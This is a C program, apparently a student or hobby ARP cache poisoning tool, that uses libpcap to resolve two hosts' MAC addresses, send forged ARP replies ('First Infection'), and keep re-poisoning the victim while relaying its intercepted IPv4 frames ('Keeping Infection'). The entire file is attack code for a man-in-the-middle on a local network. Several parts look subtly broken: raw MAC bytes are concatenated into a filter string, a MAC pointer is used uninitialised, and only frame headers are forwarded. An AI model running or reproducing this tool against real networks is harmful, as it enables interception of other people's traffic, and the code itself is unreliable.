#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <stdio.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <time.h>

typedef u_int8_t BYTE;

u_int8_t sending_packet[42];

void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 

void checkHostEntry(struct hostent * hostentry) 
{ 
    if (hostentry == NULL) 
    { 
        perror("gethostbyname"); 
        exit(1); 
    } 
} 

void checkIPbuffer(char *IPbuffer) 
{ 
    if (NULL == IPbuffer) 
    { 
        perror("inet_ntoa"); 
        exit(1); 
    } 
} 

void packet_generation(BYTE *ethdstaddr, BYTE *ethsrcaddr, int op, BYTE *arpsrcmac, BYTE *arpsrcip, BYTE *arpdstmac, BYTE *arpdstip)
{
	memcpy(sending_packet, ethdstaddr, 6);
	memcpy(sending_packet+6, ethsrcaddr, 6);
	sending_packet[12]=0x08;
	sending_packet[13]=0x06;
	sending_packet[14]=htons(1)>>8;
	sending_packet[15]=(htons(1)<<8)>>8;
	sending_packet[16]=htons(2048)>>8;
	sending_packet[17]=(htons(2048)<<8)>>8;
	sending_packet[18]=htons(6);
 	sending_packet[19]=htons(4);
 	sending_packet[20]=htons(op)>>8;
	sending_packet[21]=(htons(op)<<8)>>8;
	memcpy(sending_packet+22, arpsrcmac, 6);
	memcpy(sending_packet+28, arpsrcip, 4);
	memcpy(sending_packet+32, arpdstmac, 6);
	memcpy(sending_packet+38, arpsrcip, 4);
}

int main(int argc, char * argv[]) {
  struct ifreq ifr;
  struct ether_arp packet;
  struct ether_header header;
  struct hostent *host_entry;
  struct bpf_program fp;
  struct pcap_pkthdr *head;
  const BYTE *data;
  const BYTE *target_data;
  u_int8_t* frametype=(unsigned char*)"8060";
  char hostbuffer[256];
  char* IPbuffer;
  char filter[100]="ether proto 0x0806 and ether dst ";
  bpf_u_int32 net;
  u_int8_t senderip[4], targetip[4], attackerip[4];
  int s, i, packlen, hostname;
  BYTE broadcast[6];
  BYTE NULL_addr[6];
  BYTE IPv4[2];
  BYTE new_eth_hdr[14];

  for(i=0; i<6; i++){
    broadcast[i]=0xFF;
    NULL_addr[i]=0x00;
  }
  IPv4[0]=0x08;
  IPv4[1]=0x00;
  if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
    perror("socket");
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  strcpy(ifr.ifr_name, argv[1]);
  if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
    perror("ioctl");
    return -1;
  }
  
  packlen = sizeof(ether_header) + sizeof(ether_arp);
  u_int8_t *hwaddr = (unsigned char *)ifr.ifr_hwaddr.sa_data;
  u_int8_t *attacker_MAC;
  inet_pton(AF_INET, argv[2], senderip);
  inet_pton(AF_INET, argv[3], targetip);
  header.ether_type=ETHERTYPE_ARP;
  hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
  checkHostName(hostname); 
  host_entry = gethostbyname(hostbuffer); 
  checkHostEntry(host_entry); 
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
  inet_pton(AF_INET, IPbuffer, attackerip);
  strcat(filter, (char*)hwaddr);
  pcap_compile(handle, &fp, filter, 0, net);
  pcap_setfilter(handle, &fp);

  
//First Infection
  packet_generation(broadcast, hwaddr, 1, hwaddr, attackerip, NULL_addr, targetip);
  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
  int res2 = pcap_next_ex(handle, &head, &target_data);
  u_int8_t* target_mac = (u_int8_t*)target_data+22;
  packet_generation(broadcast, hwaddr, 1, hwaddr, attackerip, NULL_addr, senderip);
  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
  int res = pcap_next_ex(handle, &head, &data);
  u_int8_t* sender_mac = (u_int8_t*)data+22;
  packet_generation(sender_mac, hwaddr, 2, hwaddr, targetip, sender_mac, senderip);
  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));



//Keeping Infection
  time_t now;
  time_t std=time(NULL);
while(true)
{
	now=time(NULL);
	if(now-std>1)
	{
		pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
		std=now;
	}
	int res = pcap_next_ex(handle, &head, &data);
	if(memcmp(sender_mac, data+22, 6)==0 && memcmp(attackerip, data+38, 4)!=0)
		pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
	if(memcmp(IPv4, data+12, 2)==0 && memcmp(sender_mac, data+22, 6)==0 && memcmp(attackerip, data+38, 4)!=0)
	{
		memcpy(new_eth_hdr, data, 14);
		memcpy(new_eth_hdr, sender_mac, 6);
		memcpy(new_eth_hdr+6, attacker_MAC, 6);
		pcap_sendpacket(handle, new_eth_hdr, sizeof(new_eth_hdr));
	}
}

  pcap_close(handle);
  close(s);
  
  return 0;
}
